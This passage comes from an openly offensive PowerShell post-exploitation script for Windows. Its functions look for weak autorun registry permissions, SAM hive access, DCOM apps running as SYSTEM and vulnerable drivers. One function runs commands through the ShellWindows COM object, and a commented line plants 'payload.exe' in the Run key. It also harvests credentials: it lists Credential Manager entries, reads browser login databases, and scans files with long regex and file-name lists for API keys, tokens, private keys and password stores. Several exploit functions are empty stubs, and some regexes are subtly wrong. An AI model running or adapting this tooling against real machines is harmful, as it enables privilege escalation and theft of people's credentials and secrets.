                    $permission = $acl.Access | Where-Object { 
                        $_.AccessControlType -eq 'Allow' -and $_.IdentityReference -like "*$identity*" 
                    }
            
                    if ($permission) {
                        # Capture the weak permissions
                        $gCollect['OtherData']["RegistryKeyAbuse"] += @{
                            "Key"         = $path
                            "Severity"    = "High"
                            "Permissions" = $permission.IdentityReference -join ', '
                            "Tips"        = "Try to establish Dominance through back-humping"
                        }
                        Write-Output "[+] Key: $path has weak permissions for $identity. Potential severity: High."
                    }
                }
            } catch {
                if ($DEBUG_MODE) { Write-Output "[-] Error accessing registry path $path $_" }
            }
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking registry key abuse" }
    }
}

function tryRegistryKeyAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Registry Key Abuse..." }

    # Check if there are findings in the global collection
    if ($gCollect['OtherData']["RegistryKeyAbuse"].Count -eq 0) {
        Write-Output "[-] No weak Autorun Registry permissions found"
        return
    }

    # Iterate through the findings and print details
    foreach ($finding in $gCollect['OtherData']["RegistryKeyAbuse"]) {
        $key = $finding.Key
        $severity = $finding.Severity
        $permissions = $finding.Permissions -join ', '
        $tips = $finding.Tips

        Write-Output "[+] Found registry key abuse:"
        Write-Output "    - Key: $key"
        Write-Output "    - Severity: $severity"
        Write-Output "    - Permissions: $permissions"
        Write-Output "    - Tips: $tips"

        # Here you can implement the actual exploitation logic if required
        # Example: Overwriting the registry key with a malicious payload

        # Uncomment and customize the line below as needed for exploitation
        # Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\$key" -Value "payload.exe"
    }
}

function checkSAMHiveAccess {
    if ($DEBUG_MODE) { Write-Output "Checking for SAM Hive Access..." }
    $samHivePath = "C:\Windows\System32\config\SAM"
    
    # Attempt to access SAM hive with error handling
    try {
        # Check if the path exists without throwing an error on access denial
        $exists = Test-Path -Path $samHivePath -ErrorAction SilentlyContinue
        if ($exists) {
            Write-Output "[+] SAM Hive exists."
            $gCollect['OtherData']["SAMHiveAccess"] = $samHivePath
        } else {
            Write-Output "[-] SAM Hive does not exist or is inaccessible."
        }
    } catch {
        Write-Output "[-] Error accessing SAM Hive: $_"
    }
}

function trySAMHiveAccess {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via SAM Hive Access..." }
    # Logic for abusing SAM Hive (LSA Secrets) if vulnerable
}

function checkAutorunAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for Autorun Program Abuse..." }
    try {
        $autoruns = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        if ($autoruns) {
            Write-Output "[+] Autorun programs found:"
            $autoruns | ForEach-Object { Write-Output "Run Entry: $($_.PSPath)" }
            Write-Output ""
            $gCollect['OtherData']["AutorunAbuse"] = $autoruns.PSPath
        } else {
            Write-Output "[-] No vulnerable autorun programs found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking autorun abuse: $_" }
    }
}

function tryAutorunAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Autorun Program Abuse..." }
    # Logic for abusing autorun programs
}

function checkGPOAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for Insecure GPO Permissions..." }
    try {
        # Modify this according to your environment's GPO specifics
        $gpos = Get-GPO -All
        foreach ($gpo in $gpos) {
            $gpoPermissions = Get-GPPermission -Guid $gpo.Id -TargetName "Domain Admins" -TargetType Group
            if ($gpoPermissions) {
                Write-Output "[+] Insecure GPO Permissions Detected for GPO: $($gpo.DisplayName)"
                $gCollect['OtherData']["GPOAbuse"] += $gpo.DisplayName
            } else {
                Write-Output "[-] No insecure GPO permissions found for GPO: $($gpo.DisplayName)."
            }
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking GPO permissions: $_" }
    }
}

function tryGPOAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via GPO Permissions..." }
    # Logic for exploiting GPO permissions
}

function checkCOMObjectAbuse {
    if ($DEBUG_MODE) { Write-Output "Checking for COM Object Abuse..." }
    try {
        $comObjects = Get-WmiObject -Query "SELECT * FROM Win32_COMClass"
        if ($comObjects) {
            Write-Output "[+] Found COM objects."
            $gCollect['OtherData']["COMObjectAbuse"] = $comObjects.Name
        } else {
            Write-Output "[-] No COM objects found."
        }
    } catch {
        if ($DEBUG_MODE) { Write-Output "[-] Error checking COM objects: $_" }
    }
}

function tryCOMObjectAbuse {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via COM Object Abuse..." }
    # Logic for abusing COM objects
}
function checkDCOMLateralMovement {
    if ($DEBUG_MODE) { Write-Output "Checking for DCOM Lateral Movement..." }

    # Get the mapping of localized users
    $localizedUser = Get-LocalizedUserMapping

    # Define trusted identities using localized names
    $trustedIdentities = @(
        $localizedUser['nt authority\system'].LocalizedName,
        $localizedUser['administrators'].LocalizedName
    )

    # Define localized low-priv user identifiers
    $lowPrivUsers = @(
        $localizedUser['everyone'].LocalizedName,
        $localizedUser['authenticated users'].LocalizedName,
        $localizedUser['users'].LocalizedName
    )

    try {
        Write-Output "[$([char]0xD83D + [char]0xDC80)] Checking for DCOM misconfigurations..."
        $dcomApplications = Get-CimInstance Win32_DCOMApplication
        
        if ($dcomApplications) {
            Write-Output "[+] DCOM Applications detected, analyzing permissions. This will take a minute..."

            foreach ($app in $dcomApplications) {
                # Check if it's running as an elevated user (like SYSTEM or Administrator)
                $appID = $app.AppID
                $appName = $app.Name
                $appSetting = Get-CimInstance -Query "SELECT * FROM Win32_DCOMApplicationSetting WHERE AppID='$appID'"
                $runAsUser = "None"

                if ($appSetting.RunAsUser) {
                    $runAsUser = $localizedUser[$appSetting.RunAsUser.ToLower()].LocalizedName
                }

                if ($trustedIdentities -contains $runAsUser) {
                    # Populate global data with detected DCOM applications
                    Write-Output "[+] Found elevated DCOM app $appName running as $runAsUser"
                    
                    if (-not $gCollect['OtherData']["DCOMLateralMovementApps"]) {
                        $gCollect['OtherData']["DCOMLateralMovementApps"] = @()
                    }

                    # Create an object and add it to the array
                    $gCollect['OtherData']["DCOMLateralMovementApps"] += New-Object PSObject -Property @{
                        AppName   = $appName
                        AppID     = $appID
                        RunAsUser = $runAsUser  # Fixed the missing quote here
                    }

                    # Check ACLs
                    $clsidPath = "HKLM:\Software\Classes\CLSID\$appID"
                    if (Test-Path $clsidPath) {
                        $acl = Get-Acl -Path $clsidPath

                        foreach ($accessRule in $acl.Access) {
                            $identity = $localizedUser[$accessRule.IdentityReference.ToString()].LocalizedName

                            if ($accessRule.AccessControlType -eq 'Allow' -and ($lowPrivUsers -contains $identity)) {
                                Write-Output "[+] Found AppID with misconfigured Launch Permissions: $appID ($appName)"
                                $gCollect['OtherData']["DCOMLateralMovementMisconfigured"] += $appID
                            }
                        }
                    }
                }
            }
        } else {
            Write-Output "[-] No DCOM applications found."
        }
    } catch {
        Write-Output "[-] Error checking DCOM movement: $_"
    }
}
function tryDCOMLateralMovement {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via DCOM Lateral Movement..." }

    foreach ($dcomApp in $gCollect['OtherData']["DCOMLateralMovementApps"]) {
        if ($dcomApp['AppName'] -eq "ShellWindows") {
            try {
                $com = [Type]::GetTypeFromCLSID($dcomApp['AppID'])
                $obj = [System.Activator]::CreateInstance($com)
                $item = $obj.Item()
                $item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
                Write-Output "[+] Command executed via ShellWindows."
            } catch {
                Write-Output "[-] Error executing command via ShellWindows: $_"
            }
        }
    }
}

function checkEFSSettings {
    if ($DEBUG_MODE) { Write-Output "Checking for EFS Settings..." }
    
    # Check if the WMI class exists before attempting to retrieve it
    $classExists = Get-WmiObject -List | Where-Object { $_.Name -eq "Win32_EncryptableVolume" }
    
    if ($classExists) {
        try {
            $efsSettings = Get-WmiObject -Class Win32_EncryptableVolume
            if ($efsSettings) {
                Write-Output "[+] EFS settings retrieved."
                # Process EFS settings here...
            } else {
                Write-Output "[-] No EFS settings found."
            }
        } catch {
            Write-Output "[-] Error retrieving EFS settings: $_"
        }
    } else {
        Write-Output "[-] WMI Class 'Win32_EncryptableVolume' not found on this system."
    }
}

function tryEFSSettings {
    if ($DEBUG_MODE) { Write-Output "Attempting Privilege Escalation via Weak EFS Settings..." }
    # Logic for exploiting weak EFS settings
}

function checkDriversPresent {
    try {
        Write-Output "[$([char]0xD83D + [char]0xDC80)] Looking for presence of vulnerable drivers already installed..."
        foreach ($driver in $vDrivers) {
            $driverName = $driver.Name
            $driverPath = Get-ChildItem -Path C:\Windows\System32\drivers\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -eq $driverName }

            if ($driverPath) {
                Write-Output "[+] $driverName is present at $($driverPath.FullName)"
                Write-Output $driver.Message
            }
        }
        Write-Output ""
    }
    catch {
        Write-Output "[-] Error checking drivers"
    }
}

function checkCreds {
    try {
        Write-Output "[$([char]0xD83D + [char]0xDC80)] Looking for easy creds..."
        # Windows Credential Manager
        cmdkey /list
    }
    catch {
        Write-Output "[-] Error while listing Windows Credential Manager"
    }

    $databases = @(
        "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data",
        "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data",
        "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Login Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json",
        "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INet Login",
        "$env:USERPROFILE\AppData\Local\Vivaldi\User Data\Default\Login Data",
        "$env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data",
        "$env:APPDATA\Waterfox\Profiles\*.default\logins.json",
        "$env:APPDATA\Pale Moon\Profiles\*.default\logins.json"
    )
    
    $totalBrowserMatches = 0
    foreach ($dbPattern in $databases) {
        try {
            $dbPaths = Get-ChildItem -Path "$dbPattern" -ErrorAction SilentlyContinue
        }
        catch {
            if ($DEBUG_MODE) {  Write-Output "[-] Error while looking for Stored Credentials: $_" }
        }

        foreach ($dbPath in $dbPaths) {
            try {
                $path = $dbPath.FullName
                if (((Get-Acl "$path").Access.IdentityReference -match "$env:USERDOMAIN\\$env:USERNAME") -or ((Get-Acl "$path").Owner -match "$env:USERDOMAIN\\$env:USERNAME")) {
                    $content = Get-Content -Path $dbPath.FullName -ErrorAction Stop -Raw
                    if ($content -match "username|password") {
                        $totalBrowserMatches++
                        Write-Output "[+] Browser Creds match, file is accessible: $($dbPath.FullName)"
                    }
                }
            }
            catch {
                if ($DEBUG_MODE) {  Write-Output "[-] Error while looking for Stored Credentials: $_" }
            }
        }
       
    }

    if ($totalBrowserMatches) { Write-Output "" }

    # This is working, but atm disabled, cause we had strange crashes several times, maybe coincidental?
    if ($false) {
        try {
            # RDP Cred
            Write-Output "[$([char]0xD83D + [char]0xDC80)] Looking for RDP creds"
            $rdpCreds = Get-ChildItem "HKCU:\Software\Microsoft\Terminal Server Client\Servers" | ForEach-Object {
                $serverName = $_.PSChildName
                $userName = Get-ItemProperty $_.PSPath | Select-Object -ExpandProperty UsernameHint
                [PSCustomObject]@{
                    Server = $serverName
                    Username = $userName
                }
            }
            Write-Output "[+] RDP Creds found, may take a second to list..."
            Write-Output $rdpCreds
            Write-Output ""
        }
        catch {
            Write-Output "[-] Error while looking for RDP creds"
        }
    }

    # Note: Adjust patterns, include and exclude as needed. We currently experiment with more
    # complex patterns...
    try {
        Write-Output "[$([char]0xD83D + [char]0xDC80)] Scanning for creds in files"

        $dirsToSearch = @("$env:USERPROFILE", "$env:ProgramData", "$env:ProgramFiles", "$env:ProgramFiles(x86)", "$env:OneDrive") + ($env:Path -split ';')

        $regexPatterns = @(
            @{ type = 'contents'; regex = 'A3T[A-Z0-9]|AKIA|AGPA|AROA|AIPA|ANPA|ANVA|ASIA[A-Z0-9]{16}'; name = 'AWS Access Key ID Value' },
            @{ type = 'contents'; regex = 'aws_access_key_id\s{0,50}(:|=>|=)\s{0,50}(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}'; name = 'AWS Access Key ID' },
            @{ type = 'contents'; regex = 'aws_account_id\s{0,50}(:|=>|=)\s{0,50}[0-9]{4}-?[0-9]{4}-?[0-9]{4}'; name = 'AWS Account ID' },
            @{ type = 'contents'; regex = 'aws_secret_access_key\s{0,50}(:|=>|=)\s{0,50}[A-Za-z0-9/+=]{40}'; name = 'AWS Secret Access Key' },
            @{ type = 'contents'; regex = 'aws_session_token\s{0,50}(:|=>|=)\s{0,50}[A-Za-z0-9/+=]{16,}'; name = 'AWS Session Token' },
            @{ type = 'contents'; regex = 'artifactory.{0,50}[0-9a-f]{112}'; name = 'Artifactory' },
            @{ type = 'contents'; regex = 'codeclima.{0,50}[0-9a-f]{64}'; name = 'CodeClimate' },
            @{ type = 'contents'; regex = 'EAACEdEose0cBA[0-9A-Za-z]+'; name = 'Facebook Access Token' },
            @{ type = 'contents'; regex = 'type\s{0,50}(:|=>|=)\s{0,50}service_account'; name = 'Google (GCM) Service Account' },
            @{ type = 'contents'; regex = 'rk_[live|test]_[0-9a-zA-Z]{24}'; name = 'Stripe API key' },
            @{ type = 'contents'; regex = '[0-9]+-[0-9A-Za-z_]{32}\.apps\.googleusercontent\.com'; name = 'Google OAuth Key' },
            @{ type = 'contents'; regex = 'AIza[0-9A-Za-z\\-_]{35}'; name = 'Google Cloud API Key' },
            @{ type = 'contents'; regex = 'ya29\\.[0-9A-Za-z\\-_]+'; name = 'Google OAuth Access Token' },
            @{ type = 'contents'; regex = 'sk_[live|test]_[0-9a-z]{32}'; name = 'Picatic API key' },
            @{ type = 'contents'; regex = 'sq0atp-[0-9A-Za-z\\-_]{22}'; name = 'Square Access Token' },
            @{ type = 'contents'; regex = 'sq0csp-[0-9A-Za-z\\-_]{43}'; name = 'Square OAuth Secret' },
            @{ type = 'contents'; regex = 'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}'; name = 'PayPal/Braintree Access Token' },
            @{ type = 'contents'; regex = 'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'; name = 'Amazon MWS Auth Token' },
            @{ type = 'contents'; regex = 'SK[0-9a-fA-F]{32}'; name = 'Twilio API Key' },
            @{ type = 'contents'; regex = 'SG\.[0-9A-Za-z\\-_]{22}\.[0-9A-Za-z\\-_]{43}'; name = 'SendGrid API Key' },
            @{ type = 'contents'; regex = 'key-[0-9a-zA-Z]{32}'; name = 'MailGun API Key' },
            @{ type = 'contents'; regex = '[0-9a-f]{32}-us[0-9]{12}'; name = 'MailChimp API Key' },
            @{ type = 'contents'; regex = 'sshpass -p.*[''|``|"]'; name = 'SSH Password' },
            @{ type = 'contents'; regex = 'https://outlook\.office\.com/webhook/[0-9a-f-]{36}\\@'; name = 'Outlook Team URL' },
            @{ type = 'contents'; regex = 'sauce.{0,50}[0-9a-f]{36}'; name = 'Sauce Token' },
            @{ type = 'contents'; regex = 'xox[pboa]-[0-9]{12}-[0-9]{12}-[0-9]{12}-[a-z0-9]{32}'; name = 'Slack Token' },
            @{ type = 'contents'; regex = 'https://hooks.slack.com/services/T[a-zA-Z0-9_]{8}/B[a-zA-Z0-9_]{8}/[a-zA-Z0-9_]{24}'; name = 'Slack Webhook' },
            @{ type = 'contents'; regex = 'sonar.{0,50}[0-9a-f]{40}'; name = 'SonarQube Docs API Key' },
            @{ type = 'contents'; regex = 'hockey.{0,50}[0-9a-f]{32}'; name = 'HockeyApp' },
            @{ type = 'contents'; regex = '[\w+]{1,24}://([^$<]+):([^$<]+)@[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,24}([^\s]+)'; name = 'username and password in URL' },
            @{ type = 'contents'; regex = 'oy2[0-9]{43}'; name = 'NuGet API Key' },
            @{ type = 'contents'; regex = 'hawk\.[0-9A-Za-z\-_]{20}\.[0-9A-Za-z\-_]{20}'; name = 'StackHawk API Key' },
            @{ type = 'contents'; regex = '-----BEGIN (EC|RSA|DSA|OPENSSH|PGP) PRIVATE KEY'; name = 'Private Key' },
            @{ type = 'contents'; regex = 'define(.{0,20})?(DB_CHARSET|NONCE_SALT|LOGGED_IN_SALT|AUTH_SALT|NONCE_KEY|DB_HOST|DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|DB_NAME|DB_USER)(.{0,20})?[''"]{10,120}[''"]'; name = 'WP-Config' },
            @{ type = 'contents'; regex = 'aws_access_key_id.{0,20}=.[0-9a-zA-Z\/+]{20,40}'; name = 'AWS Credential File' },
            @{ type = 'contents'; regex = 'facebook.{0,20}[0-9a-f]{32}'; name = 'Facebook Secret Key' },
            @{ type = 'contents'; regex = 'facebook.{0,20}EAACEdEose0cBA'; name = 'Facebook Access Token' },
            @{ type = 'contents'; regex = 'facebook.{0,20}[0-9a-zA-Z]{10,60}'; name = 'Facebook API key' },
            @{ type = 'contents'; regex = 'twitter.{0,20}[A-Za-z0-9_]{15,50}'; name = 'Twitter Access Token' },
            @{ type = 'contents'; regex = 'mYCLp[0-9]{4}-[A-Z]{2}'; name = 'Acquia Token' }
            @{ type = 'contents'; regex = 'user(?:name)?\s*[:=]\s*[''|``|"]'; name = 'username' },
            @{ type = 'contents'; regex = 'password?\s*[:=]\s*[''|``|"]'; name = 'password' },
            @{ type = 'contents'; regex = 'pwd?\s*[:=]\s*[''|``|"]'; name = 'password' },
            @{ type = 'contents'; regex = '(?=.*\buser(?:name)?\b)(?=.*\bpassword\b)'; name = 'username and password nearby' },
            @{ type = 'contents'; regex = '(?=.*\buser(?:name)?\b)(?=.*\bpwd\b)'; name = 'username and password (pwd) nearby' },
            @{ type = 'contents'; regex = '(?=.*\blogin\b)(?=.*\bcredentials\b)'; name = 'login and credentials nearby' },
            @{ type = 'contents'; regex = 'key(?:_?\w+)?\s*[:=]'; name = 'Key' },
            @{ type = 'contents'; regex = 'token(?:_?\w+)?\s*[:=]'; name = 'Token' },
            @{ type = 'contents'; regex = 'securestring\s*[:=]'; name = 'securestring' },
            @{ type = 'contents'; regex = 'admin\s*[:=]'; name = 'admin' },
            @{ type = 'contents'; regex = 'root\s*[:=]'; name = 'root' },
            @{ type = 'contents'; regex = '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'; name = 'Email Address' },
            @{ type = 'contents'; regex = 'access_token\s*[:=]'; name = 'Access Token' },
            @{ type = 'contents'; regex = 'api_key\s*[:=]'; name = 'API Key' },
            @{ type = 'contents'; regex = 'session_id\s*[:=]'; name = 'Session ID' },
            @{ type = 'contents'; regex = 'ssh\s+\S+@\S+'; name = 'SSH login' },
            @{ type = 'contents'; regex = '-----BEGIN (PRIVATE|RSA) KEY-----'; name = 'RSA Private Key' }
        )

        $signatures = @(
            @{ type = 'extension'; match = '*.php'; name = 'PHP file' },
            @{ type = 'extension'; match = '*.txt'; name = 'Text file' },
            @{ type = 'extension'; match = '*.docx'; name = 'Word Document' },
            @{ type = 'extension'; match = '*.ini'; name = 'INI File' },
            @{ type = 'extension'; match = '*.md'; name = 'Markdown File' },
            @{ type = 'extension'; match = '*.rtf'; name = 'Rich Text Format' },
            @{ type = 'extension'; match = '*.csv'; name = 'Comma-Separated Values' },
            @{ type = 'extension'; match = '*.xml'; name = 'XML File' },
            @{ type = 'extension'; match = '*.one'; name = 'OneNote File' },
            @{ type = 'extension'; match = '*.dcn'; name = 'DCN File' },
            @{ type = 'extension'; match = '*.env'; name = 'Environment File' },
            @{ type = 'extension'; match = '*.mailmap'; name = 'Mailmap File' },
            @{ type = 'extension'; match = '*.config'; name = 'Configuration File' },
            @{ type = 'extension'; match = '*.yaml'; name = 'YAML File' },
            @{ type = 'extension'; match = '*.yml'; name = 'YAML File (alternative)' },
            @{ type = 'extension'; match = '*.json'; name = 'JSON File' },
            @{ type = 'extension'; match = '*.properties'; name = 'Properties File' },
            @{ type = 'extension'; match = '*.plist'; name = 'Property List File' },
            @{ type = 'extension'; match = '*.sh'; name = 'Shell Script' },
            @{ type = 'extension'; match = '*.ps1'; name = 'PowerShell Script' },
            @{ type = 'extension'; match = '*.py'; name = 'Python Script' },
            @{ type = 'extension'; match = '*.rb'; name = 'Ruby Script' },
            @{ type = 'extension'; match = '*.js'; name = 'JavaScript File' },
            @{ type = 'extension'; match = '*.bash'; name = 'Bash Script' },
            @{ type = 'extension'; match = '*.password'; name = 'Password File' },
            @{ type = 'extension'; match = '*.key'; name = 'Key File' },
            @{ type = 'extension'; match = '*.pem'; name = 'Potential cryptographic private key' },
            @{ type = 'extension'; match = '*.log'; name = 'Log file' },
            @{ type = 'extension'; match = '*.pkcs12'; name = 'Potential cryptographic key bundle' },
            @{ type = 'extension'; match = '*.p12'; name = 'Potential cryptographic key bundle' },
            @{ type = 'extension'; match = '*.pfx'; name = 'Potential cryptographic key bundle' },
            @{ type = 'extension'; match = '*.asc'; name = 'Potential cryptographic key bundle' },
            @{ type = 'extension'; match = '*.ovpn'; name = 'OpenVPN client configuration file' },
            @{ type = 'extension'; match = '*.id_rsa'; name = 'Potential SSH private key' },
            @{ type = 'extension'; match = '*.id_dsa'; name = 'Potential SSH private key' },
            @{ type = 'extension'; match = '*.id_ecdsa'; name = 'Potential SSH private key' },
            @{ type = 'extension'; match = '*.id_ed25519'; name = 'Potential SSH private key' },
            @{ type = 'extension'; match = '*.id_rsa.pub'; name = 'Potential SSH public key' },
            @{ type = 'extension'; match = '*.id_dsa.pub'; name = 'Potential SSH public key' },
            @{ type = 'extension'; match = '*.id_ecdsa.pub'; name = 'Potential SSH public key' },
            @{ type = 'extension'; match = '*.id_ed25519.pub'; name = 'Potential SSH public key' },
            @{ type = 'extension'; match = '*.id_rsa_old'; name = 'Potential old SSH private key' },
            @{ type = 'extension'; match = '*.id_rsa_backup'; name = 'Potential backup SSH private key' },
            @{ type = 'extension'; match = '*.id_ecdsa_old'; name = 'Potential old SSH private key' },
            @{ type = 'extension'; match = '*.id_ed25519_backup'; name = 'Potential backup SSH private key' },
            @{ type = 'extension'; match = '*.id_rsa_temp'; name = 'Potential temporary SSH private key' },
            @{ type = 'extension'; match = '*.id_dsa_temp'; name = 'Potential temporary SSH private key' },
            @{ type = 'extension'; match = '*.ssh_key'; name = 'Potential SSH key' },
            @{ type = 'extension'; match = '*.ssh_key.pub'; name = 'Potential SSH public key' },
            @{ type = 'extension'; match = '*.cscfg'; name = 'Azure service configuration schema file' },
            @{ type = 'extension'; match = '*.rdp'; name = 'Remote Desktop connection file' },
            @{ type = 'extension'; match = '*.mdf'; name = 'Microsoft SQL database file' },
            @{ type = 'extension'; match = '*.sdf'; name = 'Microsoft SQL server compact database file' },
            @{ type = 'extension'; match = '*.sqlite'; name = 'SQLite database file' },
            @{ type = 'extension'; match = '*.sqlite3'; name = 'SQLite3 database file' },
            @{ type = 'extension'; match = '*.bek'; name = 'Microsoft BitLocker recovery key file' },
            @{ type = 'extension'; match = '*.tpm'; name = 'Microsoft BitLocker Trusted Platform Module password file' },
            @{ type = 'extension'; match = '*.fve'; name = 'Windows BitLocker full volume encrypted data file' },
            @{ type = 'extension'; match = '*.jks'; name = 'Java keystore file' },
            @{ type = 'extension'; match = '*.psafe3'; name = 'Password Safe database file' },
            @{ type = 'extension'; match = '*.agilekeychain'; name = '1Password password manager database file' },
            @{ type = 'extension'; match = '*.keychain'; name = 'Apple Keychain database file' },
            @{ type = 'extension'; match = '*.pcap'; name = 'Network traffic capture file' },
            @{ type = 'extension'; match = '*.gnucash'; name = 'GnuCash database file' },
            @{ type = 'extension'; match = '*.kwallet'; name = 'KDE Wallet Manager database file' },
            @{ type = 'extension'; match = '*.tblk'; name = 'Tunnelblick VPN configuration file' },
            @{ type = 'extension'; match = '*.dayone'; name = 'Day One journal file' },
            @{ type = 'extension'; match = '*.keypair'; name = 'Potential cryptographic private key' },
            @{ type = 'extension'; match = '*.keystore'; name = 'GNOME Keyring database file' },
            @{ type = 'extension'; match = '*.keyring'; name = 'GNOME Keyring database file' },
            @{ type = 'extension'; match = '*.sql'; name = 'SQL dump file' },
            @{ type = 'extension'; match = '*.ppk'; name = 'Potential PuTTYgen private key' },
            @{ type = 'extension'; match = '*.sqldump'; name = 'SQL Data dump file' }        
            @{ type = 'filename'; match = 'otr.private_key'; name = 'Pidgin OTR private key' },
            @{ type = 'filename'; match = 'id_rsa'; name = 'Potential SSH private key' },
            @{ type = 'filename'; match = 'id_dsa'; name = 'Potential SSH private key' },
            @{ type = 'filename'; match = 'id_ecdsa'; name = 'Potential SSH private key' },
            @{ type = 'filename'; match = 'id_ed25519'; name = 'Potential SSH private key' },
            @{ type = 'filename'; match = 'id_rsa.pub'; name = 'Potential SSH public key' },
            @{ type = 'filename'; match = 'id_dsa.pub'; name = 'Potential SSH public key' },
            @{ type = 'filename'; match = 'id_ecdsa.pub'; name = 'Potential SSH public key' },
            @{ type = 'filename'; match = 'id_ed25519.pub'; name = 'Potential SSH public key' },
            @{ type = 'filename'; match = 'id_rsa_old'; name = 'Potential old SSH private key' },
            @{ type = 'filename'; match = 'id_rsa_backup'; name = 'Potential backup SSH private key' },
            @{ type = 'filename'; match = 'id_ecdsa_old'; name = 'Potential old SSH private key' },
            @{ type = 'filename'; match = 'id_ed25519_backup'; name = 'Potential backup SSH private key' },
            @{ type = 'filename'; match = 'id_rsa_temp'; name = 'Potential temporary SSH private key' },
            @{ type = 'filename'; match = 'id_dsa_temp'; name = 'Potential temporary SSH private key' },
            @{ type = 'filename'; match = 'ssh_key'; name = 'Potential SSH key' },
            @{ type = 'filename'; match = 'ssh_key.pub'; name = 'Potential SSH public key' },
            @{ type = 'filename'; match = 'secret_token.rb'; name = 'Ruby On Rails secret token configuration file' },
            @{ type = 'filename'; match = 'carrierwave.rb'; name = 'Carrierwave configuration file' },
            @{ type = 'filename'; match = 'database.yml'; name = 'Potential Ruby On Rails database configuration file' },
            @{ type = 'filename'; match = 'omniauth.rb'; name = 'OmniAuth configuration file' },
            @{ type = 'filename'; match = 'settings.py'; name = 'Django configuration file' },
            @{ type = 'filename'; match = 'jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml'; name = 'Jenkins publish over SSH plugin file' },
            @{ type = 'filename'; match = 'credentials.xml'; name = 'Potential Jenkins credentials file' },
            @{ type = 'filename'; match = 'LocalSettings.php'; name = 'Potential MediaWiki configuration file' },
            @{ type = 'filename'; match = 'Favorites.plist'; name = 'Sequel Pro MySQL database manager bookmark file' },
            @{ type = 'filename'; match = 'configuration.user.xpl'; name = 'Little Snitch firewall configuration file' },
            @{ type = 'filename'; match = 'journal.txt'; name = 'Potential jrnl journal file' },
            @{ type = 'filename'; match = 'knife.rb'; name = 'Chef Knife configuration file' },
            @{ type = 'filename'; match = 'proftpdpasswd'; name = 'cPanel backup ProFTPd credentials file' },
            @{ type = 'filename'; match = 'robomongo.json'; name = 'Robomongo MongoDB manager configuration file' },
            @{ type = 'filename'; match = '*.rsa'; name = 'Private SSH key' },
            @{ type = 'filename'; match = '*.dsa'; name = 'Private SSH key' },
            @{ type = 'filename'; match = '*.ed25519'; name = 'Private SSH key' },
            @{ type = 'filename'; match = '*.ecdsa'; name = 'Private SSH key' },
            @{ type = 'filename'; match = '.*history'; name = 'Shell command history file' },
            @{ type = 'filename'; match = '*.mysql_history'; name = 'MySQL client command history file' },
            @{ type = 'filename'; match = '*.psql_history'; name = 'PostgreSQL client command history file' },
            @{ type = 'filename'; match = '*.pgpass'; name = 'PostgreSQL password file' },
            @{ type = 'filename'; match = '*.irb_history'; name = 'Ruby IRB console history file' },
            @{ type = 'filename'; match = '*.dbeaver-data-sources.xml'; name = 'DBeaver SQL database manager configuration file' },
            @{ type = 'filename'; match = '*.muttrc'; name = 'Mutt e-mail client configuration file' },
            @{ type = 'filename'; match = '*.s3cfg'; name = 'S3cmd configuration file' },
            @{ type = 'filename'; match = 'sftp-config.json'; name = 'SFTP connection configuration file' },
            @{ type = 'filename'; match = '*.trc'; name = 'T command-line Twitter client configuration file' },
            @{ type = 'filename'; match = 'config*.php'; name = 'PHP configuration file' },
            @{ type = 'filename'; match = '*.htpasswd'; name = 'Apache htpasswd file' },
            @{ type = 'filename'; match = '*.tugboat'; name = 'Tugboat DigitalOcean management tool configuration' },
            @{ type = 'filename'; match = '*.git-credentials'; name = 'git-credential-store helper credentials file' },
            @{ type = 'filename'; match = '*.gitconfig'; name = 'Git configuration file' },
            @{ type = 'filename'; match = '*.env'; name = 'Environment configuration file' },
            @{ type = 'filename'; match = 'heroku.json'; name = 'Heroku config file' },
            @{ type = 'filename'; match = 'dump.sql'; name = 'MySQL dump w/ bcrypt hashes' },
            @{ type = 'filename'; match = 'id_rsa_pub'; name = 'Public ssh key' },
            @{ type = 'filename'; match = '.remote-sync.json'; name = 'Created by remote-sync for Atom, contains FTP and/or SCP/SFTP/SSH server details and credentials' },
            @{ type = 'filename'; match = '.esmtprc'; name = 'esmtp configuration' },
            @{ type = 'filename'; match = 'deployment-config.json'; name = 'Created by sftp-deployment for Atom, contains server details and credentials' },
            @{ type = 'filename'; match = '.ftpconfig'; name = 'Created by sftp-deployment for Atom, contains server details and credentials' }
        )

